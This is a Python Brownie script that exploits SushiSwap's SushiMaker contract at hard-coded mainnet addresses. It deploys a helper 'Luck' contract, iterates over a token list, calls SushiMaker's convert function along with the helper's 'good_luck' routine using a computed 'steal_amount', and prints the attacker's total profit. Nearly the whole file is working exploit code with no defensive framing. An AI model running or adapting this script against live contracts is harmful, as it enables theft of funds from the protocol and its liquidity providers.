from brownie import ZERO_ADDRESS, accounts, Luck, interface
from brownie.network import web3
import json
from rich import print as rprint
from rich.progress import track

weth = interface.WETH("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2")
sushi_maker = interface.SushiMaker(
    "0x6684977bBED67e101BB80Fc07fCcfba655c0a64F")
sushi_router = interface.SushiRouter(
    "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f")
sushi_factory = interface.IUniswapV2Factory(
    "0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac"
)


def main():

    with open("reports/tokens.json", "r") as f:
        tokens = json.load(f)
    errors = []
    hacker = accounts[0]
    old_balance = hacker.balance()
    luck = Luck.deploy(
        {"from": hacker, "value": web3.toWei(1, 'ether')})
    for token in track(tokens[:-5], description="exploiting..."):
        try:
            # token0 = YFI
            token0 = interface.ERC20(token["address"])
            # token1 = WETH
            token1 = interface.ERC20(
                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2")
            pair = interface.UniswapV2Pair(
                sushi_factory.getPair(token0, token1))
            slp_pair = sushi_factory.getPair(pair, weth)

            if slp_pair == ZERO_ADDRESS:
                luck.prepare(token0, token1, {"from": hacker})
            steal_amount = pair.balanceOf(sushi_maker)
            sushi_maker.convert(pair, weth, {"from": hacker})
            luck.good_luck(token0.address, token1.address,
                           steal_amount, {"from": hacker})
        except Exception as e:
            print(e)
            errors.append(token)
            continue

    luck.over({"from": hacker})
    profit = hacker.balance() - old_balance

    rprint(f'[bold magenta][Total profit][/]: {profit / 1e18}')
    rprint(f'{errors}')
